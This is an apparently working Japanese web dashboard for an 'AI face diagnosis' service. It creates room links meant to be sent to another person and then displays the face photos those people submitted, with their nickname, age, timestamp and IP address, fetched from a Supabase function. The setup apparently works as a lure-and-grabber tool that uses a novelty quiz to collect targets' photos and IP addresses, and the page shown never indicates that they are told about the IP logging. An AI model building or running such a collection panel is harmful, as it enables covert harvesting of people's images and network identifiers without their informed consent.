<!DOCTYPE html>

<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>AI顔診断 写真確認</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  padding: 20px;
  min-height: 100vh;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
  background:
    radial-gradient(circle at top, #4338ca, transparent 40%),
    linear-gradient(135deg, #0f172a, #312e81, #581c87);
  color: #222;
}

.container {
  max-width: 620px;
  margin: auto;
}

.card {
  background: rgba(255,255,255,0.98);
  padding: 22px;
  border-radius: 24px;
  box-shadow: 0 15px 50px rgba(0,0,0,0.3);
  margin-bottom: 20px;
}

h1 {
  text-align: center;
  margin-top: 0;
}

h2 {
  margin-top: 0;
}

.description {
  color: #666;
  font-size: 14px;
  line-height: 1.6;
}

button {
  width: 100%;
  padding: 15px;
  margin-top: 12px;
  border: none;
  border-radius: 13px;
  background: #111827;
  color: white;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
}

button:disabled {
  background: #999;
}

.copyButton {
  background: linear-gradient(135deg, #4f46e5, #9333ea);
}

.refreshButton {
  background: #374151;
}

.linkBox {
  display: none;
  margin-top: 18px;
  padding: 15px;
  background: #f3f4f6;
  border-radius: 15px;
  text-align: left;
}

.linkLabel {
  font-size: 13px;
  color: #666;
  margin-bottom: 6px;
}

#diagnosisLink {
  width: 100%;
  padding: 12px;
  border: 1px solid #ddd;
  border-radius: 10px;
  background: white;
  font-size: 13px;
}

.roomInfo {
  margin-top: 12px;
  font-size: 13px;
  color: #666;
  word-break: break-all;
}

.message {
  display: none;
  margin-top: 15px;
  padding: 12px;
  border-radius: 10px;
  background: #fee2e2;
  color: #991b1b;
  white-space: pre-line;
}

.successMessage {
  background: #dcfce7;
  color: #166534;
}

.photoList {
  margin-top: 15px;
}

.photoCard {
  background: #f8fafc;
  border-radius: 18px;
  padding: 15px;
  margin-top: 15px;
  text-align: left;
}

.photoCard img {
  display: block;
  width: 100%;
  max-height: 500px;
  object-fit: contain;
  background: #111;
  border-radius: 14px;
  margin-top: 12px;
}

.photoTitle {
  font-size: 18px;
  font-weight: bold;
}

.info {
  margin-top: 6px;
  font-size: 14px;
  color: #555;
  word-break: break-word;
}

.empty {
  text-align: center;
  padding: 25px 10px;
  color: #777;
}

.loading {
  text-align: center;
  padding: 25px 10px;
  color: #666;
}

.rankCard {
  position: relative;
  background: linear-gradient(135deg, #f8fafc, #eef2ff);
  border-radius: 18px;
  padding: 15px;
  margin-top: 15px;
  text-align: left;
  overflow: hidden;
}

.rankNumber {
  font-size: 28px;
  font-weight: bold;
  margin-bottom: 8px;
}

.rankPhoto {
  display: block;
  width: 100%;
  max-height: 420px;
  object-fit: contain;
  background: #111;
  border-radius: 14px;
  margin-top: 10px;
}

.rankName {
  font-size: 19px;
  font-weight: bold;
  margin-top: 12px;
}

.rankAge {
  color: #555;
  margin-top: 5px;
}

.rankScore {
  margin-top: 10px;
  font-size: 32px;
  font-weight: bold;
  color: #4f46e5;
}

.rankDate {
  margin-top: 5px;
  color: #777;
  font-size: 12px;
}

.warning {
  margin-top: 15px;
  padding: 13px;
  background: #fff7ed;
  color: #9a3412;
  border-radius: 12px;
  font-size: 12px;
  line-height: 1.6;
}
</style>

</head>

<body>

<div class="container">

<!-- ========================================
リンク作成
======================================== -->

<div class="card">

<h1>✨ AI顔診断</h1>

<p class="description">
診断用の専用リンクを作成できます。
作成したリンクを相手に送ってください。
</p>

<button
id="createLinkButton"
type="button"

>

🔗 リンクを作成 </button>

<div
  id="linkBox"
  class="linkBox"
>

<div class="linkLabel">
診断用リンク
</div>

<input
id="diagnosisLink"
readonly

>

<div
  id="roomInfo"
  class="roomInfo"
></div>

<button
id="copyButton"
class="copyButton"
type="button"

>

📋 リンクをコピー </button>

<button
id="openButton"
type="button"

>

🚀 診断ページを開く </button>

</div>

<div
  id="linkMessage"
  class="message"
></div>

</div>

<!-- ========================================
写真確認
======================================== -->

<div class="card">

<h2>📷 写真を確認</h2>

<p class="description">
現在のルームに送信された写真を確認できます。
</p>

<button
id="checkPhotosButton"
type="button"

>

📷 写真を確認 </button>

<div
  id="photoMessage"
  class="message"
></div>

<div
  id="photoLoading"
  class="loading"
  style="display:none;"
>
写真を読み込んでいます…
</div>

<div
  id="photoList"
  class="photoList"
></div>

<div class="warning">
IPアドレスは通信経路上の情報です。
IPアドレスだけで自宅住所や本名が直接分かるわけではありません。
取得した情報は、利用目的と保存期間を明確にして適切に管理してください。
</div>

</div>

<!-- ========================================
歴代ランキング
======================================== -->

<div class="card">

<h2>🏆 歴代ランキング</h2>

<p class="description">
ランキング掲載に同意した診断結果のみ表示されます。
スコアの高い順に表示します。
</p>

<button
id="rankingButton"
class="copyButton"
type="button"

>

🏆 ランキングを見る </button>

<button
id="refreshRankingButton"
class="refreshButton"
type="button"

>

🔄 ランキングを更新 </button>

<div
  id="rankingMessage"
  class="message"
></div>

<div
  id="rankingLoading"
  class="loading"
  style="display:none;"
>
ランキングを読み込んでいます…
</div>

<div
  id="rankingList"
></div>

</div>

</div>

<script>

/*
========================================
設定
========================================
*/

const PHOTO_RECEIVER_URL =
  "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";

const DIAGNOSIS_URL =
  "https://gaffney16445.github.io/ai-face-diagnosis/";

const STORAGE_KEY =
  "receiverRoom";


/*
========================================
要素
========================================
*/

const createLinkButton =
  document.getElementById(
    "createLinkButton"
  );

const linkBox =
  document.getElementById(
    "linkBox"
  );

const diagnosisLink =
  document.getElementById(
    "diagnosisLink"
  );

const roomInfo =
  document.getElementById(
    "roomInfo"
  );

const copyButton =
  document.getElementById(
    "copyButton"
  );

const openButton =
  document.getElementById(
    "openButton"
  );

const linkMessage =
  document.getElementById(
    "linkMessage"
  );

const checkPhotosButton =
  document.getElementById(
    "checkPhotosButton"
  );

const photoMessage =
  document.getElementById(
    "photoMessage"
  );

const photoLoading =
  document.getElementById(
    "photoLoading"
  );

const photoList =
  document.getElementById(
    "photoList"
  );

const rankingButton =
  document.getElementById(
    "rankingButton"
  );

const refreshRankingButton =
  document.getElementById(
    "refreshRankingButton"
  );

const rankingMessage =
  document.getElementById(
    "rankingMessage"
  );

const rankingLoading =
  document.getElementById(
    "rankingLoading"
  );

const rankingList =
  document.getElementById(
    "rankingList"
  );


/*
========================================
現在のルーム
========================================
*/

let currentRoom =
  localStorage.getItem(
    STORAGE_KEY
  ) || "";


/*
========================================
HTMLエスケープ
========================================
*/

function escapeHtml(
  value
) {

  return String(
    value ?? ""
  )
  .replace(
    /&/g,
    "&amp;"
  )
  .replace(
    /</g,
    "&lt;"
  )
  .replace(
    />/g,
    "&gt;"
  )
  .replace(
    /"/g,
    "&quot;"
  )
  .replace(
    /'/g,
    "&#039;"
  );

}


/*
========================================
ルームID作成
========================================
*/

function createRoomId() {

  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  let result = "";

  for (
    let i = 0;
    i < 12;
    i++
  ) {

    result +=
      chars[
        Math.floor(
          Math.random() *
          chars.length
        )
      ];

  }

  return result;

}


/*
========================================
ルーム表示
========================================
*/

function updateRoomDisplay() {

  if (!currentRoom) {

    linkBox.style.display =
      "none";

    return;

  }


  const url =
    DIAGNOSIS_URL +
    "?room=" +
    encodeURIComponent(
      currentRoom
    );


  diagnosisLink.value =
    url;


  roomInfo.textContent =
    "現在のルームID：" +
    currentRoom;


  linkBox.style.display =
    "block";

}


/*
========================================
リンク作成
========================================
*/

createLinkButton.addEventListener(
  "click",
  function() {

    currentRoom =
      createRoomId();


    localStorage.setItem(
      STORAGE_KEY,
      currentRoom
    );


    updateRoomDisplay();


    linkMessage.textContent =
      "診断用リンクを作成しました。";

    linkMessage.className =
      "message successMessage";

    linkMessage.style.display =
      "block";

  }
);


/*
========================================
コピー
========================================
*/

copyButton.addEventListener(
  "click",
  async function() {

    const url =
      diagnosisLink.value;


    if (!url) {

      return;

    }


    try {

      await navigator.clipboard.writeText(
        url
      );


      linkMessage.textContent =
        "リンクをコピーしました！";

      linkMessage.className =
        "message successMessage";

      linkMessage.style.display =
        "block";


    } catch (error) {

      diagnosisLink.select();

      document.execCommand(
        "copy"
      );


      linkMessage.textContent =
        "リンクをコピーしました！";

      linkMessage.className =
        "message successMessage";

      linkMessage.style.display =
        "block";

    }

  }
);


/*
========================================
診断ページを開く
========================================
*/

openButton.addEventListener(
  "click",
  function() {

    if (!diagnosisLink.value) {

      alert(
        "先にリンクを作成してください。"
      );

      return;

    }


    window.open(
      diagnosisLink.value,
      "_blank"
    );

  }
);


/*
========================================
写真確認
========================================
*/

checkPhotosButton.addEventListener(
  "click",
  async function() {

    photoMessage.style.display =
      "none";


    photoList.innerHTML =
      "";


    if (!currentRoom) {

      photoMessage.textContent =
        "先に「リンクを作成」を押してください。";

      photoMessage.style.display =
        "block";

      return;

    }


    photoLoading.style.display =
      "block";


    try {

      const url =
        PHOTO_RECEIVER_URL +
        "?room=" +
        encodeURIComponent(
          currentRoom
        );


      const response =
        await fetch(
          url
        );


      const data =
        await response.json();


      if (!response.ok) {

        throw new Error(
          data.error ||
          "写真の取得に失敗しました。"
        );

      }


      if (
        !data.photos ||
        data.photos.length === 0
      ) {

        photoList.innerHTML =
          '<div class="empty">まだ写真はありません。</div>';

        return;

      }


      data.photos.forEach(
        function(photo) {

          const card =
            document.createElement(
              "div"
            );


          card.className =
            "photoCard";


          const name =
            escapeHtml(
              photo.nickname ||
              "未入力"
            );


          const age =
            photo.age !== null &&
            photo.age !== undefined &&
            photo.age !== ""
              ? escapeHtml(
                  photo.age
                ) +
                "歳"
              : "未入力";


          const ip =
            escapeHtml(
              photo.ip ||
              "取得できませんでした"
            );


          const created =
            photo.created_at
              ? new Date(
                  photo.created_at
                ).toLocaleString(
                  "ja-JP"
                )
              : "不明";


          card.innerHTML =

            '<div class="photoTitle">' +
            '📷 写真' +
            '</div>' +

            '<div class="info">' +
            '👤 ' +
            name +
            ' さん' +
            '</div>' +

            '<div class="info">' +
            '🎂 年齢：' +
            age +
            '</div>' +

            '<div class="info">' +
            '🌐 IP：' +
            ip +
            '</div>' +

            '<div class="info">' +
            '🕐 送信日時：' +
            escapeHtml(
              created
            ) +
            '</div>' +

            '<img src="' +
            escapeHtml(
              photo.url
            ) +
            '" alt="送信された写真">';


          photoList.appendChild(
            card
          );

        }
      );


    } catch (error) {

      console.error(error);


      photoMessage.textContent =
        "写真の取得に失敗しました。\n\n" +
        error.message;


      photoMessage.style.display =
        "block";


    } finally {

      photoLoading.style.display =
        "none";

    }

  }
);


/*
========================================
ランキング取得
========================================
*/

async function loadRanking() {

  rankingMessage.style.display =
    "none";


  rankingList.innerHTML =
    "";


  rankingLoading.style.display =
    "block";


  try {

    const url =
      PHOTO_RECEIVER_URL +
      "?ranking=true";


    const response =
      await fetch(
        url
      );


    const data =
      await response.json();


    if (!response.ok) {

      throw new Error(
        data.error ||
        "ランキングの取得に失敗しました。"
      );

    }


    if (
      !data.rankings ||
      data.rankings.length === 0
    ) {

      rankingList.innerHTML =
        '<div class="empty">' +
        'まだランキングデータがありません。' +
        '</div>';

      return;

    }


    data.rankings.forEach(
      function(item, index) {

        const card =
          document.createElement(
            "div"
          );


        card.className =
          "rankCard";


        const rank =
          index + 1;


        let rankMark =
          "🏅";


        if (rank === 1) {
          rankMark = "🥇";
        } else if (rank === 2) {
          rankMark = "🥈";
        } else if (rank === 3) {
          rankMark = "🥉";
        }


        const name =
          escapeHtml(
            item.nickname ||
            "匿名"
          );


        const age =
          item.age !== null &&
          item.age !== undefined &&
          item.age !== ""
            ? escapeHtml(
                item.age
              ) +
              "歳"
            : "年齢非公開";


        const score =
          Number.isFinite(
            Number(item.score)
          )
            ? Number(item.score)
            : 0;


        const created =
          item.created_at
            ? new Date(
                item.created_at
              ).toLocaleString(
                "ja-JP"
              )
            : "不明";


        card.innerHTML =

          '<div class="rankNumber">' +
          rankMark +
          ' 第' +
          rank +
          '位' +
          '</div>' +

          '<img class="rankPhoto" ' +
          'src="' +
          escapeHtml(
            item.url
          ) +
          '" ' +
          'alt="ランキング写真">' +

          '<div class="rankName">' +
          '👤 ' +
          name +
          '</div>' +

          '<div class="rankAge">' +
          '🎂 ' +
          age +
          '</div>' +

          '<div class="rankScore">' +
          '💯 ' +
          score +
          ' / 100' +
          '</div>' +

          '<div class="rankDate">' +
          '🕐 ' +
          escapeHtml(
            created
          ) +
          '</div>';


        rankingList.appendChild(
          card
        );

      }
    );


  } catch (error) {

    console.error(error);


    rankingMessage.textContent =
      "ランキングの取得に失敗しました。\n\n" +
      error.message;


    rankingMessage.style.display =
      "block";


  } finally {

    rankingLoading.style.display =
      "none";

  }

}


/*
========================================
ランキングボタン
========================================
*/

rankingButton.addEventListener(
  "click",
  loadRanking
);


refreshRankingButton.addEventListener(
  "click",
  loadRanking
);


/*
========================================
保存済みルームを復元
========================================
*/

if (currentRoom) {

  updateRoomDisplay();

}

</script>

</body>
</html>
